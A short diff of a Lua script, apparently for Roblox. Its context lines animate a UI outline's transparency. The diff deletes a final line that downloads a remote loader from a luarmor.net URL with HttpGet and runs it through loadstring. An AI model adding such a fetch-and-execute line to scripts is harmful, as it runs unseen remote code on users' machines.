@@ -589,4 +589,3 @@ RunService.Heartbeat:Connect(function()
 	local alpha = (math.sin(t * 1.5) + 1) / 2
 	mainStroke.Transparency = 0.2 + alpha * 0.4
 end)
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
